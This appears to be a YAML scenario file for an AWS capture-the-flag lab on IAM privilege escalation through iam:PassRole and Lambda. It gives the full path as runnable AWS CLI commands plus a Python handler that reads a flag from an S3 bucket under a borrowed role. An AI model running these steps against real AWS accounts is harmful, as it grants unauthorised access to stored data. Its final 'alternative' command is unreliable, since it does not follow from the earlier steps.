attackMap:
  nodes:
    - id: starting-principal
      label: "Starting User"
      type: principal
      subType: iam-user
      arn: "arn:aws:iam::{account_id}:user/pl-prod-lambda-001-to-bucket-starting-user"
      access:
        type: assumed-breach-credentials
      description: >
        You have gained access to this principal's AWS IAM credentials. These could
        have been obtained through many real-world vectors: phishing a developer and
        gaining access to their workstation, compromising a browser session, exploiting
        a vulnerable workload running in this AWS account, discovering credentials in
        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.

        Regardless of how you obtained them, you are now operating as this principal.
        This IAM user has iam:PassRole permission on the target bucket-access role, along
        with lambda:CreateFunction and lambda:InvokeFunction permissions. This combination
        allows you to create a Lambda function that runs as the bucket-access role and
        reads the flag directly from the target S3 bucket.

    - id: lambda-function
      label: "Lambda Function"
      type: resource
      subType: lambda-function
      arn: "arn:aws:lambda:{region}:{account_id}:function/pl-lambda-001-to-bucket-extractor"
      description: >
        This Lambda function is created by the attacker during the attack. It is
        configured to use the bucket-access target role as its execution role. When
        invoked, the function reads the flag object from the target S3 bucket and
        returns its contents in the response body.

    - id: target-bucket
      label: "Target S3 Bucket"
      type: resource
      subType: s3-bucket
      isTarget: true
      arn: "arn:aws:s3:::pl-prod-lambda-001-to-bucket-{account_id}-{suffix}"
      description: >
        This S3 bucket contains the CTF flag as flag.txt. The bucket-access target
        role has s3:GetObject and s3:ListBucket permissions on this bucket. By
        passing this role to a Lambda function and invoking it, the attacker reads
        the flag without ever directly holding s3:GetObject themselves.

  edges:
    - from: starting-principal
      to: lambda-function
      label: "iam:PassRole + lambda:CreateFunction"
      description: >
        Create a Lambda function that uses the bucket-access target role as its
        execution role. The iam:PassRole permission allows the starting user to
        associate the target role with the new Lambda function. The handler is
        written to read the flag object from the target S3 bucket and return its
        contents in the response body.
      hints:
        - "Create a Lambda function using iam:PassRole (via the --role flag) to assign the bucket-access role as the execution role. Write a handler that uses the boto3 S3 client to read flag.txt from the target bucket and return the contents in the response body. Invoke the function with an empty payload and parse the flag from the returned body JSON."
        - "Browse to https://pathfinding.cloud/paths/lambda-001 for technique details."
      commands:
        - description: "Create a Lambda deployment package that reads the flag from the target S3 bucket"
          command: |
            TARGET_BUCKET=$(aws s3api list-buckets --query "Buckets[?starts_with(Name, 'pl-prod-lambda-001-to-bucket-')].Name" --output text)
            cat > /tmp/lambda_function.py << EOF
            import json, boto3, os
            def lambda_handler(event, context):
                bucket = os.environ.get('TARGET_BUCKET', '${TARGET_BUCKET}')
                s3 = boto3.client('s3')
                obj = s3.get_object(Bucket=bucket, Key='flag.txt')
                flag = obj['Body'].read().decode('utf-8')
                return {'statusCode': 200, 'body': json.dumps({'flag': flag})}
            EOF
            cd /tmp && zip -q lambda_function.zip lambda_function.py
        - description: "Create the Lambda function with the bucket-access execution role"
          command: "aws lambda create-function --function-name pl-lambda-001-to-bucket-extractor --runtime python3.11 --role arn:aws:iam::{account_id}:role/pl-prod-lambda-001-to-bucket-target-role --handler lambda_function.lambda_handler --zip-file fileb:///tmp/lambda_function.zip --timeout 30"
        - description: "Wait for the function to reach Active state"
          command: "aws lambda wait function-active --function-name pl-lambda-001-to-bucket-extractor"

    - from: lambda-function
      to: target-bucket
      label: "lambda:InvokeFunction"
      description: >
        Invoke the Lambda function to execute the handler under the target role's
        identity. The function reads flag.txt from the target S3 bucket using the
        execution role's s3:GetObject permission and returns the flag value in the
        response body.
      hints: []
      commands:
        - description: "Invoke the Lambda function and capture the response"
          command: "aws lambda invoke --function-name pl-lambda-001-to-bucket-extractor --payload '{}' /tmp/response.json && cat /tmp/response.json | jq '.'"
        - description: "Parse and print the flag from the response body"
          command: "cat /tmp/response.json | jq -r '.body' | jq -r '.flag'"
        - description: "Capture the CTF flag directly from S3 using the Lambda execution role's credentials (alternative)"
          command: "aws s3 cp s3://pl-prod-lambda-001-to-bucket-{account_id}-{suffix}/flag.txt -"
